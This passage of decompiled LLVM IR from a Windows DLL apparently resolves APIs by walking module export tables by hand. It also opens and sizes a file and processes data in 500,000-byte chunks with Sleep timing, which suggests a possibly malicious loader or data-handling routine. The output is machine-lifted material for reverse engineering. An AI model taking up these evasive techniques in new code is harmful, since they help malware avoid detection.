  store i32 %207, i32* %.pre-phi.reg2mem, !insn.addr !6886
  store i32 %231, i32* %esp.2.reg2mem, !insn.addr !6886
  br label %dec_label_pc_1000b851, !insn.addr !6886

dec_label_pc_1000b851:                            ; preds = %dec_label_pc_1000b771.dec_label_pc_1000b851_crit_edge, %dec_label_pc_1000b78e
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %254 = call i32 @GetTickCount(), !insn.addr !6887
  %255 = and i32 %254, 65535, !insn.addr !6888
  %256 = call i32 @function_1000b0c0(), !insn.addr !6889
  %257 = add i32 %esp.2.reload, -4, !insn.addr !6890
  %258 = inttoptr i32 %257 to i32*, !insn.addr !6890
  store i32 %255, i32* %258, align 4, !insn.addr !6890
  %259 = add i32 %esp.2.reload, -12, !insn.addr !6891
  %260 = inttoptr i32 %259 to i32*, !insn.addr !6891
  store i32 %255, i32* %260, align 4, !insn.addr !6891
  %261 = call i32 @function_100074a0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !6892
  %262 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !6893
  %263 = add i32 %esp.2.reload, -20, !insn.addr !6894
  %264 = inttoptr i32 %263 to i32*, !insn.addr !6894
  store i32 ptrtoint ([4 x i8]* @global_var_100395b8 to i32), i32* %264, align 4, !insn.addr !6894
  %265 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !6895
  %266 = add i32 %esp.2.reload, -24, !insn.addr !6846
  %267 = inttoptr i32 %266 to i32*, !insn.addr !6846
  store i32 %.pre-phi.reload, i32* %267, align 4, !insn.addr !6846
  %268 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !6896
  %269 = add i32 %esp.2.reload, -28, !insn.addr !6897
  %270 = inttoptr i32 %269 to i32*, !insn.addr !6897
  store i32 ptrtoint ([3 x i8]* @global_var_100395b0 to i32), i32* %270, align 4, !insn.addr !6897
  %271 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !6898
  %272 = add i32 %esp.2.reload, -32, !insn.addr !6899
  %273 = inttoptr i32 %272 to i32*, !insn.addr !6899
  store i32 %88, i32* %273, align 4, !insn.addr !6899
  %274 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6900
  %275 = add i32 %esp.2.reload, -36, !insn.addr !6901
  %276 = inttoptr i32 %275 to i32*, !insn.addr !6901
  store i32 %93, i32* %276, align 4, !insn.addr !6901
  %277 = add i32 %esp.2.reload, -40, !insn.addr !6902
  %278 = inttoptr i32 %277 to i32*, !insn.addr !6902
  store i32 %arg1, i32* %278, align 4, !insn.addr !6902
  %279 = add i32 %esp.2.reload, -44, !insn.addr !6903
  %280 = inttoptr i32 %279 to i32*, !insn.addr !6903
  store i32 %120, i32* %280, align 4, !insn.addr !6903
  %281 = add i32 %esp.2.reload, -48, !insn.addr !6904
  %282 = inttoptr i32 %281 to i32*, !insn.addr !6904
  store i32 %121, i32* %282, align 4, !insn.addr !6904
  %283 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6905
  %284 = ptrtoint i32* %stack_var_-2564 to i32, !insn.addr !6906
  store i32 %284, i32* %276, align 4, !insn.addr !6906
  store i32 1000, i32* %278, align 4, !insn.addr !6907
  store i32 808606036, i32* %stack_var_-28, align 4, !insn.addr !6908
  %285 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !6909
  store i32 %285, i32* %280, align 4, !insn.addr !6909
  %286 = load i32, i32* %stack_var_-28, align 4, !insn.addr !6910
  %287 = inttoptr i32 %286 to i32*, !insn.addr !6910
  %288 = call i32 @function_10001170(i32* %287), !insn.addr !6910
  store i32 100, i32* %282, align 4, !insn.addr !6911
  store i32 808540500, i32* %stack_var_-28, align 4, !insn.addr !6912
  %289 = add i32 %esp.2.reload, -52, !insn.addr !6913
  %290 = inttoptr i32 %289 to i32*, !insn.addr !6913
  store i32 0, i32* %290, align 4, !insn.addr !6913
  %291 = add i32 %esp.2.reload, -56, !insn.addr !6914
  %292 = inttoptr i32 %291 to i32*, !insn.addr !6914
  %293 = ptrtoint i32* %stack_var_-932 to i32, !insn.addr !6914
  store i32 %293, i32* %292, align 4, !insn.addr !6914
  store i32 878202964, i32* %stack_var_-80, align 4, !insn.addr !6915
  store i32 878202964, i32* %stack_var_-60, align 4, !insn.addr !6916
  %294 = call i32* @_memset(i32* inttoptr (i32 878202964 to i32*), i32 1680750649, i32 29793), !insn.addr !6917
  store i32 1634038339, i32* %stack_var_-932, align 4, !insn.addr !6918
  %295 = call i32 @function_10009390(), !insn.addr !6919
  store i32 259, i32* %282, align 4, !insn.addr !6920
  store i32 0, i32* %290, align 4, !insn.addr !6921
  %296 = ptrtoint i32* %stack_var_-1563 to i32, !insn.addr !6922
  store i32 %296, i32* %292, align 4, !insn.addr !6922
  %297 = inttoptr i32 %295 to i32*, !insn.addr !6923
  %298 = call i32* @_memset(i32* %297, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6923
  %299 = call i32 @function_10009390(), !insn.addr !6924
  store i32 259, i32* %282, align 4, !insn.addr !6925
  store i32 0, i32* %290, align 4, !insn.addr !6926
  %300 = ptrtoint i32* %stack_var_-1299 to i32, !insn.addr !6927
  store i32 %300, i32* %292, align 4, !insn.addr !6927
  %301 = inttoptr i32 %299 to i32*, !insn.addr !6928
  %302 = call i32* @_memset(i32* %301, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6928
  %303 = call i32 @function_10009390(), !insn.addr !6929
  store i32 %285, i32* %282, align 4, !insn.addr !6930
  store i32 %arg2, i32* %290, align 4, !insn.addr !6931
  %304 = inttoptr i32 %303 to i8*, !insn.addr !6932
  %305 = call i8* @_strstr(i8* %304, i8* bitcast (i32* @1 to i8*)), !insn.addr !6932
  %306 = icmp eq i8* %305, null, !insn.addr !6933
  %307 = icmp eq i1 %306, false, !insn.addr !6934
  store i32 %279, i32* %esp.3.reg2mem, !insn.addr !6934
  br i1 %307, label %dec_label_pc_1000baac, label %dec_label_pc_1000ba32, !insn.addr !6934

dec_label_pc_1000ba32:                            ; preds = %dec_label_pc_1000b851
  %308 = ptrtoint i32* %stack_var_-80 to i32, !insn.addr !6935
  store i32 %308, i32* %282, align 4, !insn.addr !6935
  store i32 %arg2, i32* %290, align 4, !insn.addr !6936
  %309 = call i8* @_strstr(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6937
  %310 = icmp eq i8* %309, null, !insn.addr !6938
  %311 = icmp eq i1 %310, false, !insn.addr !6939
  store i32 %279, i32* %esp.3.reg2mem, !insn.addr !6939
  br i1 %311, label %dec_label_pc_1000baac, label %dec_label_pc_1000ba43, !insn.addr !6939

dec_label_pc_1000ba43:                            ; preds = %dec_label_pc_1000ba32
  %312 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !6940
  store i32 %312, i32* %282, align 4, !insn.addr !6940
  store i32 %arg2, i32* %290, align 4, !insn.addr !6941
  %313 = call i8* @_strstr(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6942
  %314 = icmp eq i8* %313, null, !insn.addr !6943
  %315 = icmp eq i1 %314, false, !insn.addr !6944
  store i32 %279, i32* %esp.3.reg2mem, !insn.addr !6944
  br i1 %315, label %dec_label_pc_1000baac, label %dec_label_pc_1000ba54, !insn.addr !6944

dec_label_pc_1000ba54:                            ; preds = %dec_label_pc_1000ba43
  %316 = ptrtoint i8* %313 to i32, !insn.addr !6942
  store i32 %316, i32* %282, align 4, !insn.addr !6945
  store i32 128, i32* %290, align 4, !insn.addr !6946
  store i32 2, i32* %292, align 4, !insn.addr !6947
  %317 = add i32 %esp.2.reload, -60, !insn.addr !6948
  %318 = inttoptr i32 %317 to i32*, !insn.addr !6948
  store i32 %316, i32* %318, align 4, !insn.addr !6948
  %319 = add i32 %esp.2.reload, -64, !insn.addr !6949
  %320 = inttoptr i32 %319 to i32*, !insn.addr !6949
  store i32 %316, i32* %320, align 4, !insn.addr !6949
  %321 = add i32 %esp.2.reload, -68, !insn.addr !6950
  %322 = inttoptr i32 %321 to i32*, !insn.addr !6950
  store i32 1073741824, i32* %322, align 4, !insn.addr !6950
  %323 = add i32 %esp.2.reload, -72, !insn.addr !6951
  %324 = inttoptr i32 %323 to i32*, !insn.addr !6951
  store i32 %284, i32* %324, align 4, !insn.addr !6951
  store i32 %arg2, i32* %edx.0.reg2mem, !insn.addr !6952
  br label %dec_label_pc_1000ba81, !insn.addr !6952

dec_label_pc_1000ba81:                            ; preds = %dec_label_pc_1000ba81, %dec_label_pc_1000ba54
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %325 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !6953
  %326 = load i8, i8* %325, align 1, !insn.addr !6953
  %327 = add i32 %edx.0.reload, 1, !insn.addr !6954
  %328 = icmp eq i8 %326, 0, !insn.addr !6955
  %329 = icmp eq i1 %328, false, !insn.addr !6956
  store i32 %327, i32* %edx.0.reg2mem, !insn.addr !6956
  br i1 %329, label %dec_label_pc_1000ba81, label %dec_label_pc_1000ba88, !insn.addr !6956

dec_label_pc_1000ba88:                            ; preds = %dec_label_pc_1000ba81
  %330 = sub i32 %edx.0.reload, %arg2, !insn.addr !6957
  %331 = add i32 %esp.2.reload, -76, !insn.addr !6958
  %332 = inttoptr i32 %331 to i32*, !insn.addr !6958
  store i32 0, i32* %332, align 4, !insn.addr !6958
  %333 = add i32 %esp.2.reload, -80, !insn.addr !6959
  %334 = inttoptr i32 %333 to i32*, !insn.addr !6959
  %335 = ptrtoint i32* %stack_var_-11624 to i32, !insn.addr !6959
  store i32 %335, i32* %334, align 4, !insn.addr !6959
  %336 = add i32 %esp.2.reload, -84, !insn.addr !6960
  %337 = inttoptr i32 %336 to i32*, !insn.addr !6960
  store i32 %330, i32* %337, align 4, !insn.addr !6960
  %338 = add i32 %esp.2.reload, -88, !insn.addr !6961
  %339 = inttoptr i32 %338 to i32*, !insn.addr !6961
  store i32 %arg2, i32* %339, align 4, !insn.addr !6961
  %340 = add i32 %esp.2.reload, -92, !insn.addr !6962
  %341 = inttoptr i32 %340 to i32*, !insn.addr !6962
  store i32 %284, i32* %341, align 4, !insn.addr !6962
  %342 = add i32 %esp.2.reload, -96, !insn.addr !6963
  %343 = inttoptr i32 %342 to i32*, !insn.addr !6963
  store i32 %284, i32* %343, align 4, !insn.addr !6963
  store i32 %342, i32* %esp.3.reg2mem, !insn.addr !6964
  br label %dec_label_pc_1000baac, !insn.addr !6964

dec_label_pc_1000baac:                            ; preds = %dec_label_pc_1000ba88, %dec_label_pc_1000ba43, %dec_label_pc_1000ba32, %dec_label_pc_1000b851
  %344 = add i32 %esp.2.reload, -8, !insn.addr !6965
  %345 = inttoptr i32 %344 to i32*, !insn.addr !6965
  %346 = add i32 %esp.2.reload, -16, !insn.addr !6966
  %347 = inttoptr i32 %346 to i32*, !insn.addr !6966
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %348 = add i32 %esp.3.reload, -4, !insn.addr !6967
  %349 = inttoptr i32 %348 to i32*, !insn.addr !6967
  store i32 %105, i32* %349, align 4, !insn.addr !6967
  %350 = add i32 %esp.3.reload, -8, !insn.addr !6968
  %351 = inttoptr i32 %350 to i32*, !insn.addr !6968
  store i32 %88, i32* %351, align 4, !insn.addr !6968
  %352 = load i32, i32* @global_var_10040944, align 4, !insn.addr !6969
  %353 = add i32 %esp.3.reload, -12, !insn.addr !6969
  %354 = inttoptr i32 %353 to i32*, !insn.addr !6969
  store i32 %352, i32* %354, align 4, !insn.addr !6969
  br label %dec_label_pc_1000bac4, !insn.addr !6970

dec_label_pc_1000bac4:                            ; preds = %dec_label_pc_1000b150, %dec_label_pc_1000baac
  %355 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6971
  ret i32 %355, !insn.addr !6972
}

define i32 @function_1000bae0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bae0:
  %esp.3.reg2mem = alloca i32, !insn.addr !6973
  %edx.0.reg2mem = alloca i32, !insn.addr !6973
  %esp.2.reg2mem = alloca i32, !insn.addr !6973
  %.pre-phi.reg2mem = alloca i32, !insn.addr !6973
  %esp.1.reg2mem = alloca i32, !insn.addr !6973
  %esp.0.reg2mem = alloca i32, !insn.addr !6973
  %stack_var_-11592.0.reg2mem = alloca i32, !insn.addr !6973
  %stack_var_-11580.0.reg2mem = alloca i32, !insn.addr !6973
  %ecx.0.reg2mem = alloca i32, !insn.addr !6973
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-11624 = alloca i32, align 4
  %stack_var_-1299 = alloca i32, align 4
  %stack_var_-1563 = alloca i32, align 4
  %stack_var_-932 = alloca i32, align 4
  %stack_var_-2564 = alloca i32, align 4
  %2 = call i64 @__decompiler_undefined_function_6()
  %stack_var_-11564 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-412 = alloca i8*, align 4
  %stack_var_-308 = alloca i128, align 8
  %stack_var_-828 = alloca i32, align 4
  %stack_var_-11576 = alloca i32, align 4
  %stack_var_-516 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-1036 = alloca i32, align 4
  %stack_var_-188 = alloca i8*, align 4
  %stack_var_-28 = alloca i32, align 4
  %3 = call i32 @__chkstk(), !insn.addr !6974
  %4 = inttoptr i32 %1 to i32*, !insn.addr !6975
  %5 = call i32* @_memset(i32* %4, i32 %0, i32 %arg1), !insn.addr !6975
  %6 = ptrtoint i8** %stack_var_-188 to i32, !insn.addr !6976
  %7 = bitcast i8** %stack_var_-188 to i32*, !insn.addr !6977
  %8 = call i32* @_memset(i32* nonnull %7, i32 0, i32 100), !insn.addr !6977
  %9 = ptrtoint i32* %stack_var_-1036 to i32, !insn.addr !6978
  store i32 %9, i32* %stack_var_-28, align 4, !insn.addr !6978
  %10 = call i32* @_memset(i32* nonnull %stack_var_-1036, i32 0, i32 100), !insn.addr !6979
  %11 = call i32* @GetModuleHandleA(i8* inttoptr (i32 1852990827 to i8*)), !insn.addr !6980
  %12 = ptrtoint i32* %11 to i32, !insn.addr !6980
  store i8* inttoptr (i32 1684107084 to i8*), i8** %stack_var_-188, align 4, !insn.addr !6981
  %13 = add i32 %12, 60, !insn.addr !6982
  %14 = inttoptr i32 %13 to i32*, !insn.addr !6982
  %15 = load i32, i32* %14, align 4, !insn.addr !6982
  %16 = add i32 %12, 120, !insn.addr !6983
  %17 = add i32 %16, %15, !insn.addr !6983
  %18 = inttoptr i32 %17 to i32*, !insn.addr !6983
  %19 = load i32, i32* %18, align 4, !insn.addr !6983
  %20 = add i32 %19, %12, !insn.addr !6984
  store i32 %12, i32* %stack_var_-28, align 4, !insn.addr !6985
  %21 = call i32 @function_10009e60(i32 1684107084, i32* inttoptr (i32 1919052108 to i32*)), !insn.addr !6986
  %22 = add i32 %20, 36, !insn.addr !6987
  %23 = inttoptr i32 %22 to i32*, !insn.addr !6987
  %24 = load i32, i32* %23, align 4, !insn.addr !6987
  %25 = mul i32 %21, 2, !insn.addr !6988
  %26 = add i32 %25, %12, !insn.addr !6988
  %27 = add i32 %26, %24, !insn.addr !6989
  %28 = inttoptr i32 %27 to i16*, !insn.addr !6989
  %29 = load i16, i16* %28, align 2, !insn.addr !6989
  %30 = zext i16 %29 to i32, !insn.addr !6989
  %31 = add i32 %20, 28, !insn.addr !6990
  %32 = inttoptr i32 %31 to i32*, !insn.addr !6990
  %33 = load i32, i32* %32, align 4, !insn.addr !6990
  %34 = mul i32 %30, 4, !insn.addr !6991
  %35 = add i32 %33, %12, !insn.addr !6991
  %36 = add i32 %35, %34, !insn.addr !6992
  %37 = inttoptr i32 %36 to i32*, !insn.addr !6992
  %38 = load i32, i32* %37, align 4, !insn.addr !6992
  %39 = add i32 %38, %12, !insn.addr !6993
  store i32 %39, i32* @global_var_1004094c, align 4, !insn.addr !6994
  store i8* inttoptr (i32 1633906508 to i8*), i8** %stack_var_-188, align 4, !insn.addr !6995
  %40 = add i32 %39, 60, !insn.addr !6996
  %41 = inttoptr i32 %40 to i32*, !insn.addr !6996
  %42 = load i32, i32* %41, align 4, !insn.addr !6996
  %43 = add i32 %39, 120, !insn.addr !6997
  %44 = add i32 %43, %42, !insn.addr !6997
  %45 = inttoptr i32 %44 to i32*, !insn.addr !6997
  %46 = load i32, i32* %45, align 4, !insn.addr !6997
  %47 = add i32 %46, %39, !insn.addr !6998
  store i32 %6, i32* %stack_var_-28, align 4, !insn.addr !6999
  %48 = call i32 @function_10009e60(i32 1633906508, i32* inttoptr (i32 1701987948 to i32*)), !insn.addr !7000
  %49 = add i32 %47, 36, !insn.addr !7001
  %50 = inttoptr i32 %49 to i32*, !insn.addr !7001
  %51 = load i32, i32* %50, align 4, !insn.addr !7001
  %52 = mul i32 %48, 2, !insn.addr !7002
  %53 = add i32 %52, %39, !insn.addr !7002
  %54 = add i32 %53, %51, !insn.addr !7003
  %55 = inttoptr i32 %54 to i16*, !insn.addr !7003
  %56 = load i16, i16* %55, align 2, !insn.addr !7003
  %57 = zext i16 %56 to i32, !insn.addr !7003
  %58 = add i32 %47, 28, !insn.addr !7004
  %59 = inttoptr i32 %58 to i32*, !insn.addr !7004
  %60 = load i32, i32* %59, align 4, !insn.addr !7004
  %61 = mul i32 %57, 4, !insn.addr !7005
  %62 = add i32 %60, %39, !insn.addr !7005
  %63 = add i32 %62, %61, !insn.addr !7006
  %64 = inttoptr i32 %63 to i32*, !insn.addr !7006
  %65 = load i32, i32* %64, align 4, !insn.addr !7006
  %66 = add i32 %65, %39, !insn.addr !7007
  %67 = inttoptr i32 %66 to i32*, !insn.addr !7008
  %68 = call i32* @_memset(i32* %67, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7008
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-516, align 4, !insn.addr !7009
  %69 = ptrtoint i8** %stack_var_-516 to i32, !insn.addr !7010
  store i32 %69, i32* %stack_var_-28, align 4, !insn.addr !7010
  %70 = call i32* @GetModuleHandleA(i8* inttoptr (i32 1852990827 to i8*)), !insn.addr !7011
  store i8* inttoptr (i32 1684107084 to i8*), i8** %stack_var_-188, align 4, !insn.addr !7012
  %71 = call i32 @function_10009390(), !insn.addr !7013
  store i32 %71, i32* @global_var_1004094c, align 4, !insn.addr !7014
  store i8* inttoptr (i32 1633906508 to i8*), i8** %stack_var_-188, align 4, !insn.addr !7015
  %72 = call i32 @function_10009390(), !insn.addr !7016
  store i32 %72, i32* %stack_var_-11576, align 4, !insn.addr !7017
  %73 = inttoptr i32 %72 to i32*, !insn.addr !7018
  %74 = call i32* @_memset(i32* %73, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7018
  %75 = call i32* @_memset(i32* nonnull %stack_var_-828, i32 0, i32 100), !insn.addr !7019
  %76 = bitcast i128* %stack_var_-308 to i32*, !insn.addr !7020
  %77 = call i32* @_memset(i32* nonnull %76, i32 0, i32 100), !insn.addr !7020
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-412, align 4, !insn.addr !7021
  %78 = call i32* @GetModuleHandleA(i8* inttoptr (i32 1852990827 to i8*)), !insn.addr !7022
  store i32 1684107084, i32* %stack_var_-828, align 4, !insn.addr !7023
  %79 = call i32 @function_10009390(), !insn.addr !7024
  store i32 %79, i32* @global_var_1004094c, align 4, !insn.addr !7025
  %80 = ptrtoint i8** %stack_var_-412 to i32, !insn.addr !7026
  store i32 %80, i32* %stack_var_-40, align 4, !insn.addr !7026
  store i128 1701602642, i128* %stack_var_-308, align 8, !insn.addr !7027
  %81 = call i32 @function_10009390(), !insn.addr !7028
  %82 = load i128, i128* @global_var_10039bb0, align 4, !insn.addr !7029
  %83 = call i128 @__asm_movaps(i128 %82), !insn.addr !7029
  call void @__asm_movups(i128 undef, i128 %83), !insn.addr !7030
  %84 = call i32 @function_10009390(), !insn.addr !7031
  store i32 1684104530, i32* %stack_var_-1036, align 4, !insn.addr !7032
  %85 = call i32 @function_10009390(), !insn.addr !7033
  %86 = inttoptr i32 %85 to i32*, !insn.addr !7034
  %87 = call i32* @_memset(i32* %86, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7034
  %88 = call i32 @function_10009390(), !insn.addr !7035
  store i32 0, i32* %stack_var_-60, align 4, !insn.addr !7036
  store i32 -2147483648, i32* %stack_var_-80, align 4, !insn.addr !7037
  %89 = inttoptr i32 %88 to i8*, !insn.addr !7038
  %90 = call i32* @CreateFileA(i8* %89, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !7038
  %91 = icmp eq i32* %90, inttoptr (i32 -1 to i32*), !insn.addr !7039
  %92 = icmp eq i1 %91, false, !insn.addr !7040
  br i1 %92, label %dec_label_pc_1000bed9, label %dec_label_pc_1000c45b, !insn.addr !7040

dec_label_pc_1000bed9:                            ; preds = %dec_label_pc_1000bae0
  %93 = call i32 @GetFileSize(i32* %90, i32* nonnull @1), !insn.addr !7041
  %94 = call i32 @function_100074a0(i32 %93), !insn.addr !7042
  %95 = call i32 @function_10001170(i32* bitcast ([3 x i8]* @global_var_100395a8 to i32*)), !insn.addr !7043
  store i32 %arg2, i32* %ecx.0.reg2mem, !insn.addr !7044
  br label %dec_label_pc_1000bf20, !insn.addr !7044

dec_label_pc_1000bf20:                            ; preds = %dec_label_pc_1000bf20, %dec_label_pc_1000bed9
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %96 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !7045
  %97 = load i8, i8* %96, align 1, !insn.addr !7045
  %98 = add i32 %ecx.0.reload, 1, !insn.addr !7046
  %99 = icmp eq i8 %97, 0, !insn.addr !7047
  %100 = icmp eq i1 %99, false, !insn.addr !7048
  store i32 %98, i32* %ecx.0.reg2mem, !insn.addr !7048
  br i1 %100, label %dec_label_pc_1000bf20, label %dec_label_pc_1000bf27, !insn.addr !7048

dec_label_pc_1000bf27:                            ; preds = %dec_label_pc_1000bf20
  %101 = call i1 @CloseHandle(i32* %90), !insn.addr !7049
  %102 = inttoptr i32 %arg2 to i8*, !insn.addr !7050
  %103 = call i32 @lstrlenA(i8* %102), !insn.addr !7050
  %104 = call i32 @function_100077e0(), !insn.addr !7051
  %105 = inttoptr i32 %104 to i8*, !insn.addr !7052
  %106 = call i32 @lstrlenA(i8* %105), !insn.addr !7052
  %107 = udiv i32 %106, 500000, !insn.addr !7053
  %108 = call i32 @GetTickCount(), !insn.addr !7054
  %109 = and i32 %108, 65535, !insn.addr !7055
  %110 = call i32 @function_1000b0c0(), !insn.addr !7056
  %111 = call i32 @function_100074a0(i32 %109), !insn.addr !7057
  %112 = inttoptr i32 %0 to i8*, !insn.addr !7058
  %113 = call i8* @lstrcatA(i8* %89, i8* %112), !insn.addr !7059
  %114 = call i8* @lstrcatA(i8* %89, i8* inttoptr (i8 ptrtoint ([4 x i8]* @global_var_100395ac to i8) to i8*)), !insn.addr !7060
  %115 = bitcast i32* %stack_var_-40 to i8*
  store i8* %89, i8** %stack_var_-188, align 4, !insn.addr !7061
  %116 = call i8* @lstrcatA(i8* %89, i8* nonnull %115), !insn.addr !7062
  %117 = call i8* @lstrcatA(i8* %89, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100395b0, i32 0, i32 0)), !insn.addr !7063
  store i8* %89, i8** %stack_var_-200, align 4, !insn.addr !7064
  %118 = call i32 @lstrlenA(i8* %89), !insn.addr !7065
  %119 = ptrtoint i32* %stack_var_-11576 to i32, !insn.addr !7066
  %120 = ptrtoint i32* %stack_var_-11564 to i32, !insn.addr !7067
  %121 = trunc i32 %arg1 to i8, !insn.addr !7068
  %122 = call i32 @function_1000a4e0(i32 %120, i32 %119, i8 %121, i32 %arg3), !insn.addr !7068
  %123 = call i128 @__asm_xorps(i128 %83, i128 %83), !insn.addr !7069
  %124 = ptrtoint i8** %stack_var_-200 to i32, !insn.addr !7070
  call void @__asm_movq.31(i64 %2, i128 %123), !insn.addr !7071
  store i8* inttoptr (i32 61 to i8*), i8** %stack_var_-200, align 4, !insn.addr !7072
  %125 = icmp ult i32 %106, 500000
  store i32 %124, i32* %esp.1.reg2mem, !insn.addr !7073
  br i1 %125, label %dec_label_pc_1000c101, label %dec_label_pc_1000c050.preheader, !insn.addr !7073

dec_label_pc_1000c050.preheader:                  ; preds = %dec_label_pc_1000bf27
  %126 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %104, i32* %stack_var_-11580.0.reg2mem
  store i32 %107, i32* %stack_var_-11592.0.reg2mem
  store i32 %124, i32* %esp.0.reg2mem
  br label %dec_label_pc_1000c050

dec_label_pc_1000c050:                            ; preds = %dec_label_pc_1000c050.preheader, %dec_label_pc_1000c050
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %stack_var_-11592.0.reload = load i32, i32* %stack_var_-11592.0.reg2mem
  %stack_var_-11580.0.reload = load i32, i32* %stack_var_-11580.0.reg2mem
  %127 = add i32 %esp.0.reload, -4, !insn.addr !7074
  %128 = inttoptr i32 %127 to i32*, !insn.addr !7074
  store i32 1000, i32* %128, align 4, !insn.addr !7074
  call void @Sleep(i32 %stack_var_-11580.0.reload), !insn.addr !7075
  %129 = call i32 @GetTickCount(), !insn.addr !7076
  %130 = call i32 @function_1000b0c0(), !insn.addr !7077
  %131 = add i32 %esp.0.reload, -8, !insn.addr !7078
  %132 = inttoptr i32 %131 to i32*, !insn.addr !7078
  %133 = add i32 %esp.0.reload, -12, !insn.addr !7079
  %134 = inttoptr i32 %133 to i32*, !insn.addr !7079
  store i32 %88, i32* %134, align 4, !insn.addr !7079
  %135 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7080
  %136 = add i32 %esp.0.reload, -16, !insn.addr !7081
  %137 = inttoptr i32 %136 to i32*, !insn.addr !7081
  %138 = add i32 %esp.0.reload, -20, !insn.addr !7082
  %139 = inttoptr i32 %138 to i32*, !insn.addr !7082
  store i32 %88, i32* %139, align 4, !insn.addr !7082
  %140 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7083
  %141 = add i32 %esp.0.reload, -24, !insn.addr !7084
  %142 = inttoptr i32 %141 to i32*, !insn.addr !7084
  store i32 ptrtoint ([4 x i8]* @global_var_100395b4 to i32), i32* %142, align 4, !insn.addr !7084
  %143 = add i32 %esp.0.reload, -28, !insn.addr !7085
  %144 = inttoptr i32 %143 to i32*, !insn.addr !7085
  store i32 %88, i32* %144, align 4, !insn.addr !7085
  %145 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7086
  %146 = add i32 %esp.0.reload, -32, !insn.addr !7087
  %147 = inttoptr i32 %146 to i32*, !insn.addr !7087
  store i32 %126, i32* %147, align 4, !insn.addr !7087
  %148 = add i32 %esp.0.reload, -36, !insn.addr !7088
  %149 = inttoptr i32 %148 to i32*, !insn.addr !7088
  store i32 %88, i32* %149, align 4, !insn.addr !7088
  %150 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7089
  %151 = add i32 %esp.0.reload, -40, !insn.addr !7090
  %152 = inttoptr i32 %151 to i32*, !insn.addr !7090
  store i32 %124, i32* %152, align 4, !insn.addr !7090
  %153 = add i32 %esp.0.reload, -44, !insn.addr !7091
  %154 = inttoptr i32 %153 to i32*, !insn.addr !7091
  store i32 %88, i32* %154, align 4, !insn.addr !7091
  %155 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7092
  %156 = add i32 %esp.0.reload, -48, !insn.addr !7093
  %157 = inttoptr i32 %156 to i32*, !insn.addr !7093
  store i32 %88, i32* %157, align 4, !insn.addr !7093
  %158 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7094
  %159 = add i32 %esp.0.reload, -52, !insn.addr !7095
  %160 = inttoptr i32 %159 to i32*, !insn.addr !7095
  store i32 500000, i32* %160, align 4, !insn.addr !7095
  %161 = add i32 %esp.0.reload, -56, !insn.addr !7096
  %162 = inttoptr i32 %161 to i32*, !insn.addr !7096
  store i32 %stack_var_-11580.0.reload, i32* %162, align 4, !insn.addr !7096
  %163 = add i32 %158, %88
  %164 = add i32 %esp.0.reload, -60, !insn.addr !7097
  %165 = inttoptr i32 %164 to i32*, !insn.addr !7097
  store i32 %163, i32* %165, align 4, !insn.addr !7097
  %166 = call i32 @_memcpy.12(), !insn.addr !7098
  %167 = add i32 %163, 500000, !insn.addr !7099
  %168 = inttoptr i32 %167 to i8*, !insn.addr !7099
  store i8 0, i8* %168, align 1, !insn.addr !7099
  store i32 %arg3, i32* %160, align 4, !insn.addr !7100
  store i32 %arg1, i32* %162, align 4, !insn.addr !7101
  store i32 %119, i32* %165, align 4, !insn.addr !7102
  %169 = add i32 %esp.0.reload, -64, !insn.addr !7103
